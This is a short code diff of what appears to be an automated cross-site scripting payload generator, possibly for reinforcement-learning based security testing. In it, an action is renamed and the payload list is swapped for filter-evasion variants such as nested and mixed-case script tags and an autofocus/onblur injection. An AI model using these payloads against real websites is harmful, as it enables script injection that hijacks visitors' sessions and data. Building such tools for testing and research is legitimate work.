@@ -56,7 +56,7 @@ class Enviroment:
                 1: self.actionAddDxRandomChar
             },
             self.states_name_to_location["findValidHtml"]:{
-                0: self.actionInjectionInTag,
+                0: self.actionInjectionInText,
                 1: self.actionInjectionInAttribute
             },
             self.states_name_to_location["avoidHtmlFilters"]:{
@@ -302,7 +302,7 @@ class Enviroment:
 
     # ACTIONS FIND VALID HTML
 
-    def actionInjectionInTag(self):
+    def actionInjectionInText(self):
         # Set default html payload
         htmlPayload = "<img src=x onerror={}>"
         self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
@@ -328,11 +328,10 @@ class Enviroment:
     # ACTIONS AVOID HTML FILTERS
 
     def actionNewHtmlPayload(self):
-        htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<input onblur={} autofocus><input autofocus>"]
+        htmlPayloads = ["<sc<script>ript>{}</scri</script>pt>","<sCript>{}</sCRIpt>","<input onblur={} autofocus><input autofocus>"]
         htmlPayload = "".join(random.choices(htmlPayloads, k=1))
         self.html = htmlPayload
         self.xssExploit.setHtmlBody(htmlPayload,htmlPayload)
-
     
     def actionDubleEncode(self):
         # Encoding dictionaries
